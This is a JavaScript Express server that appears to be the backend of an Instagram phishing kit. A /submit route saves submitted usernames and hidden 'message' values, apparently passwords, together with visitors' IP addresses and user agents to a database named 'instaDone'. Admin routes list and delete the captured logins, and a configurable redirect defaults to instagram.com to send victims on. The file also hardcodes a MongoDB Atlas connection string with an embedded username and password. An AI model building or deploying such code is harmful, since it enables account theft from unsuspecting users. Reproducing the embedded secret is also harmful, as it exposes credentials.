// Import required dependencies
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

// Initialize the app
const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files from both "public" folder and root folder
app.use(express.static(path.join(__dirname, '..', 'public')));
app.use(express.static(path.join(__dirname, '..')));
app.use('/images', express.static(path.join(__dirname, '..', 'images')));

// MongoDB Atlas connection string
const mongoURI = process.env.MONGODB_URI || 'mongodb+srv://coderrohit2927:Rohit%402927@cluster0.45pafsa.mongodb.net/instaDone?retryWrites=true&w=majority';

// Connect to MongoDB Atlas
mongoose.connect(mongoURI)
  .then(() => console.log('Connected to MongoDB Atlas'))
  .catch(err => console.error('Error connecting to MongoDB:', err));

// Define schemas and models

// Login data schema
const loginSchema = new mongoose.Schema({
  username: { type: String, required: true },
  message: { type: String, required: true },
  userAgent: { type: String },
  ipAddress: { type: String },
  timestamp: { type: Date, default: Date.now }
});

const Login = mongoose.model('Login', loginSchema);

// Settings schema
const settingsSchema = new mongoose.Schema({
  key: { type: String, required: true, unique: true },
  value: { type: mongoose.Schema.Types.Mixed, required: true }
});

const Settings = mongoose.model('Settings', settingsSchema);

// ============== API ROUTES ==============

// Route to handle form submission
app.post('/submit', async (req, res) => {
  try {
    const { username, message } = req.body;

    // Get additional info
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    // Save the login data to the database
    const newLogin = new Login({
      username,
      message,
      userAgent,
      ipAddress
    });
    await newLogin.save();

    console.log('Data saved:', { username, message: '***hidden***', timestamp: new Date() });
    res.status(200).json({ success: true, message: 'Data saved successfully!' });
  } catch (error) {
    console.error('Error saving data:', error);
    res.status(500).json({ success: false, message: 'Internal Server Error' });
  }
});

// Get all login attempts
app.get('/api/logins', async (req, res) => {
  try {
    const logins = await Login.find().sort({ timestamp: -1 }).limit(500);
    res.status(200).json(logins);
  } catch (error) {
    console.error('Error fetching data:', error);
    res.status(500).json({ success: false, message: 'Internal Server Error' });
  }
});

// Delete a login entry
app.delete('/api/logins/:id', async (req, res) => {
  try {
    const { id } = req.params;
    await Login.findByIdAndDelete(id);
    res.status(200).json({ success: true, message: 'Entry deleted successfully' });
  } catch (error) {
    console.error('Error deleting entry:', error);
    res.status(500).json({ success: false, message: 'Internal Server Error' });
  }
});

// Get settings
app.get('/api/settings', async (req, res) => {
  try {
    const redirectSetting = await Settings.findOne({ key: 'redirectUrl' });
    res.status(200).json({
      redirectUrl: redirectSetting ? redirectSetting.value : 'https://www.instagram.com/'
    });
  } catch (error) {
    console.error('Error fetching settings:', error);
    res.status(500).json({ success: false, message: 'Internal Server Error' });
  }
});

// Save settings
app.post('/api/settings', async (req, res) => {
  try {
    const { redirectUrl } = req.body;

    await Settings.findOneAndUpdate(
      { key: 'redirectUrl' },
      { key: 'redirectUrl', value: redirectUrl },
      { upsert: true, new: true }
    );

    res.status(200).json({ success: true, message: 'Settings saved successfully' });
  } catch (error) {
    console.error('Error saving settings:', error);
    res.status(500).json({ success: false, message: 'Internal Server Error' });
  }
});

// Get redirect URL (for frontend use)
app.get('/api/redirect-url', async (req, res) => {
  try {
    const redirectSetting = await Settings.findOne({ key: 'redirectUrl' });
    const url = redirectSetting ? redirectSetting.value : 'https://www.instagram.com/';
    res.status(200).json({ redirectUrl: url });
  } catch (error) {
    console.error('Error fetching redirect URL:', error);
    res.status(200).json({ redirectUrl: 'https://www.instagram.com/' });
  }
});

// ============== PAGE ROUTES ==============

// Serve the main HTML page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

// Serve admin page
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'admin.html'));
});

// Catch-all route to serve index.html for any unmatched routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

// Export the app for Vercel
module.exports = app;

// Start the server locally if not on Vercel
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
}
